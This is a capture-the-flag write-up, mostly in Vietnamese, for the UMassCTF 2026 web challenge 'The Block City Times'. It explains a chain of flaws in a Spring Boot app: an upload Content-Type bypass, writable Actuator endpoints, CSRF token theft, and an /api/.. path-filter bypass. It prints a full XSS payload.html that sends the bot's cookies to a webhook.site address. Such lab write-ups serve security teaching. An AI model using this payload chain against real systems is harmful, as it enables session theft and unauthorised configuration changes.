---
title: "The Block City Times"
date: 2026-05-13
platform: "UMassCTF 2026"
category: "Web"
difficulty: "Medium"
tags: ["web", "umassctf-2026"]
series: "UMMassCTF 2026"
draft: false
---

# The Block City Times
## Challenge Information
- **Category**: Web Exploitation
- **Event**: UMassCTF 2026
- **Author**: Larry (MrLarryMan
- **Difficulty**: Medium
- **Tags**: #web #XSS
---
## 1. Description
>After 3 decades of service in the pirate's crew, you have decided that now is a good time to retire. However, you're currently broke, and need a solid fund to live confortably in retirement. Steal the treasure from the captain!
## 2. Overview

## 3. Reconnaissance
Một trang web có khá nhiều chức năng và giao diện cũng không đơn giản =)) 

![](./images/Pasted%20image%2020260414183017.png)

Vì thế mình quyết định đọc source để tìm những chỗ đáng nghi ngờ luôn. Source map các file cần chú ý của bài này như sau:

```
block-city-times
├── src/main/java/com/example/demo
│   ├── config
│   │   └── SecurityConfig.java        <-- Cấu hình phân quyền Spring Boot
│   ├── controller
│   │   ├── admin
│   │   │   └── ReportController.java  <-- Endpoint /admin/report
│   │   └── web
│   │       └── StoryController.java   <-- Endpoint /submit
├── editorial
│   └── server.js                      <-- Node.js & Puppeteer
├── developer
│   ├── trigger-server.js              <-- Trạm trung chuyển (Proxy) 
│   └── report-api.js                  <-- Bot 2
└── docker-compose.yml                 <-- Cấu hình điều phối toàn bộ dịch vụ
```

Check các file thì ta có thể thấy mục tiêu của ta là FLAG nằm trong biến môi trường FLAG của service `report-runner`, file `docker-compose.yml:

![](./images/Pasted%20image%2020260414232316.png)

Để hiểu rõ hơn về cách kết nối cũng như giao tiếp của các docker thì mình có vẽ Network Topology để tóm tắt `docker-compose.yml` như sau:

```tex
[ Internet]
                              │
                              ▼ (Mở port host: ${PORT} -> 8080)
╔════════════════════════════════════════════════════════════════╗
║                   Network: web (Driver: bridge)                ║
║                                                                ║
║   ┌──────────────────────────┐    ┌──────────────────────────┐ ║
║   │       Service: app       │    │ Service: report-runner   │ ║
║   │--------------------------│    │--------------------------│ ║
║   │ Listen Port: 8080        │    │ Listen Port: 9001        │ ║
║   │ Target: editorial:9000   │    │ Holds: FLAG Variable     │ ║
║   └─────────────┬────────────┘    └─────────────┬────────────┘ ║
╚═════════════════│═══════════════════════════════│══════════════╝
                  │                               │
╔═════════════════│═══════════════════════════════│══════════════╗
║ [Alias: app.internal]                 [Alias: report-runner]   ║
║                                                                ║
║         Network: editorial-net (internal: true)                ║
║                                                                ║
║                 ┌──────────────────────────┐                   ║
║                 │    Service: editorial    │                   ║
║                 │--------------------------│                   ║
║                 │ Listen Port: 9000        │                   ║
║                 │ Target: app.internal:8080│                   ║
║                 └──────────────────────────┘                   ║
╚════════════════════════════════════════════════════════════════╝
```

Nhìn vào sơ đồ mạng này ta có thể thấy hệ thống chia làm 2 vùng mạng:

- **`web`**: Mạng bridge tiêu chuẩn. Các container trong mạng này có thể tự do gửi request ra ngoài Internet.
- **`editorial-net`**: Mạng bridge nhưng được gắn cờ `internal: true`. Docker sẽ không cấu hình Default Gateway ra ngoài cho mạng này. Các docker trong vùng mạng này sẽ không thể liên lạc ra internet.

Ngoài ra các service như `app` và `report-runner` khi vào trong vùng `editorial-net` phải sử dụng bí danh nội bộ riêng thay vì tên thật.

Sau khi hiểu cách giao tiếp giữa các docker ta sẽ trực tiếp kiểm tra xem cấu hình của từng docker có gì, gồm 3 docker như sau:

- `/Dockerfile` (docker web): Tổng quan khá sạch và cũng chưa có gì khả nghi

	![](./images/Pasted%20image%2020260414234235.png)

- `/editorial/Dockerfile`: Có lẽ đây là một con bot sử dụng trình duyệt chromium và chạy ở cổng 9000

![](./images/Pasted%20image%2020260415000653.png)

- `/developer/Dockerfile`: Cũng là một con bot tương tự editorial nhưng chạy ở cổng 9001:

	![](./images/Pasted%20image%2020260415002156.png)

Nhìn chung source rất phức tạp nhưng nếu đọc và tóm gọn lại thì ta có thể tóm tắt luồng của ứng dụng mà ta cần quan tâm để khai thác lỗ hổng như sau:

- Backend Java chịu trách nhiệm nhận File Upload tại `StoryController`, phân quyền truy cập đường dẫn tại `SecurityConfig` sau đó check dữ liệu Report thông qua `ReportController`.

- `editorial` và `developer` đóng vai trò là 2 người admin duyệt web tự động chạy ngầm trong cơ sở hạ tầng.

Nhưng để hiểu hơn về cách các lỗ hổng mà tiếp theo mình sẽ phân tích thì chúng ta cần nắm trước một số khái niệm cơ bản trong Java như sau:

Theo gemini:
1. Java Spring Boot & Spring Security

- **Spring MVC / REST:** Quản lý giao thức HTTP. Ví dụ: `@Controller` trả về giao diện HTML, `@RestController` trả về dữ liệu nội bộ JSON.

- **Thymeleaf:** Là một engine render HTML (Template Engine) phổ biến của Java. Khi một form HTML được tạo ra qua Thymeleaf, Spring Security tự động tiêm một biến gọi là `_csrf` gốc vào form để bảo vệ.

- **Spring Security (Filter Chain):** Được định nghĩa cấu hình tại `SecurityConfig.java`. Nó sử dụng cơ chế chuỗi lọc (Filter Chain) nhằm xác định quyền truy cập vào tài nguyên. Nó phân rõ 2 nhóm endpoint: `/api` (công khai, tắt CSRF), và `/admin`, `/files` (chỉ dành cho Role `ADMIN`, bật CSRF hạn chế xâm nhập).

2. Spring Boot Actuator & Spring Cloud Configuration

- **Actuator:** Là một bộ công cụ ẩn cực kỳ quyền lực của Spring Boot, giúp kỹ sư dễ dàng theo dõi "sức khỏe" và điều chỉnh "thông số động" (Environment properties) của máy chủ trực tiếp ngay khi nó đang chạy (Runtime) mà không cần khởi động lại.

    - Endpoint `/actuator/env`: Cung cấp danh sách các biến môi trường, và cho phép **ghi đè** chúng qua method `POST`.

    - Endpoint `/actuator/refresh`: Thông báo cho Spring Boot phải tải lại (reload) các Bean được đóng dấu `@RefreshScope` để ăn ngay giá trị mới cấu hình.

Tiếp theo mình sẽ phân tích sâu hơn source code để tìm các sơ hở của dev.

`/controller/web/StoryController.java`: ở chức năng `/submit` của trang web ta dễ dạng nhận ra sự bất cẩn trong việc check định dạng file, quá trình xử lý file như sau:

![](./images/Pasted%20image%2020260415221932.png)

Nhưng vấn để ở đây nằm ở khối lệnh (1),  lệnh `file.getContentType()` của Java Spring chỉ đơn thuần là lấy giá trị của chuỗi khai báo trong header `Content-Type:` trong gói tin HTTP và không hề check nội dung thật sự bên trong. 
--> Ta có thể lợi dụng để tải lên một file có tên là `payload.html` nhưng cố tình thay đổi `Content-Type` là `text/plain` server vẫn tưởng Content-Type thật sự của nó là `text/plain`.

Kiểm tra tiếp route `/files/{filename}`: 

![](./images/Pasted%20image%2020260415231642.png)

Thoạt nhìn ta thấy đoạn code này vẫn an toàn và điểm sáng là còn chống cả Path Traversal, nhưng dev lại quên mấy một điều hàm `probeContentType()` sẽ chuẩn đoán content type của file dựa trên đuôi file mà hoàn toàn không quan tâm đến việc lúc người dùng upload lên đã khai báo `Content-Type` là gì.

Và nếu trình duyệt Chromium của Bot nhận được file kèm theo header `text/html`. Trình duyệt sẽ render nó như một trang web bình thường và thực thi toàn bộ mã JavaScript nằm bên trong.

Bây giờ mọi thứ đã rõ, ta chỉ cần tìm cách gọi con bot report-runner truy cập vào nơi chứa payload XSS và để nó tự trigger gửi flag về cho ta là xong.

Nhưng mọi thứ thường không dễ như thế, khi mình check file `ReportController.java` thì một thử thách mới lại hiện ra:

- Trước khi chạy report thì hệ thống phải xác nhận ActiveConfig phải là `dev`

![](./images/Pasted%20image%2020260415235552.png)

- Ở `AdminController.java` thì mình lại phát hiện tính năng đổi trạng thái đã có sẵn ở trang admin, nhưng nó lại bị kiểm tra bởi `EnforceProduction`:

![](./images/Pasted%20image%2020260416005337.png)

Và tất nhiên cả 2 cái này đều đã bị chặn, check file `AppProperties.java`:

![](./images/Pasted%20image%2020260416005444.png)

--> Sẽ không thể nào switch sang `dev` để không tắt được cái `enforceProduction` kia đi.

Tuy nhiên ta có thể gián tiếp tắc và chuyển chế độ thông qua bot có quyền admin và ghi đè các biến này, nhưng rào cản ở đây lại là lệnh ghi đè các biến này chỉ được thực hiện qua Actuator (POST `/actuator/env`), vốn được bảo vệ bằng Basic Auth và CSRF.

Và vấn đề này cũng đã được giải quyết nhờ các sai lầm khá nghiêm trọng của dev:

![](./images/Pasted%20image%2020260416011457.png)

--> Ta có thể ghi đè các biến trên mà không cần CSRF, chỉ cần session của admin (điều này Bot đã sẵn có).

```js
await fetch(base + '/actuator/env', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{"name": "app.enforce-production", "value": "false"}' });

await fetch(base + '/actuator/env', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{"name": "app.active-config", "value": "dev"}' });

await fetch(base + '/actuator/refresh', { method: 'POST' });
```

Nhưng để gọi bot `POST /admin/report` thì ta lại cần phải có CSRF Token, mình sẽ giải quyết bằng cách cho bot gọi đến trang dashboard của admin (`fetch('/admin')`), lục lọi và bóc tách đoạn Regex `_csrf` nhét vào biến mới được gửi đi:

```js
var admin_html = await (await fetch(base + '/admin')).text();
var csrf_match = admin_html.match(/name="_csrf" value="([^"]+)"/);
```

Có một vấn đề cuối cùng là bộ lọc của Admin đã chặn lệnh truyền xuống Bot report-runner:

```java
if (!endpoint.startsWith("/api/"))
```

Ta có thể bypass đơn giản bằng cách điền `endpoint = /api/../files/UUID-payload.html`, `/api/` ở đầu tiên sẽ so khớp và cho qua, sau đó trình chuẩn hóa sẽ tự lùi về 1 cấp và rút gọn thành `http://app.internal:8080/files/UUID-payload.html`.
## 4. Exploitation
Ghép các lỗ hổng thì ta sẽ lợi dụng sự rời rạc trong việc check content type của web để bypass và upload file html có script như sau:

- LỢI DỤNG ACTUATOR: Gọi Tắt Biến Môi Trường thông qua bot editorial.
- Lấy cắp CSRF Token từ Admin dashboard thông qua bot editorial.
- Bypass `/api/` và gọi bot report-runner truy cập vào `payload.html` để lấy flag
- Để không bị vòng lặp vô hạn, ta sẽ check flag trước, nếu có sẽ gửi và return ngay.

Full `payload.html`:

```js
<!DOCTYPE html>
<html>
<body>
<script>
(async function() {
  var base = window.location.origin;
  var self_path = window.location.pathname;
  var webhook = "https://webhook.site/YOUR_WEBHOOK_URL_HERE";

  var exfiltrate = (val) => {
    new Image().src = webhook + "?data=" + encodeURIComponent(val);
  };

// nếu là bot report
  var cookies = document.cookie;
  if (cookies.includes('FLAG') || cookies.includes('UMASS')) {
    exfiltrate("FLAG_CAUGHT: " + cookies);
    return;
  }

//ngược lại
  try {
    await fetch(base + '/actuator/env', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{"name": "app.enforce-production", "value": "false"}' });
    await fetch(base + '/actuator/env', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{"name": "app.active-config", "value": "dev"}' });
    await fetch(base + '/actuator/refresh', { method: 'POST' });

    var admin_html = await (await fetch(base + '/admin')).text();
    var csrf_match = admin_html.match(/name="_csrf" value="([^"]+)"/);
    if (!csrf_match) return;
    
    var fd = new FormData();
    fd.append('_csrf', csrf_match[1]);
    
    fd.append('endpoint', "/api/.." + self_path);
    
    await fetch(base + '/admin/report', { method: 'POST', body: fd });
    
  } catch(e) { }  
})();
</script>
</body>
</html>
```

Đã lấy được flag:

![](./images/Screenshot%202026-04-11%20123218.png)

>h@ppy h@ck!n9 
>*(BKSEC)*